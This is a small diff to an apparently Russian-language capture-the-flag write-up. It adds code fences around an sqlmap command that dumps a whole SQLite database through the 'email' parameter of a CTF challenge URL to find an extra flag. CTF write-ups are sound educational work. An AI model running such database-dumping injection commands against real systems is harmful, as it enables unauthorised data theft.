@@ -27,4 +27,6 @@ function be() {
 ```
 
 4. Еще один дополнительный flag находим с помощью sqlmap
+```
 sqlmap -u http://easygame.ctf2019.rocks/addresult?email=p --dump-all --keep-alive --dbms=sqlite
+```
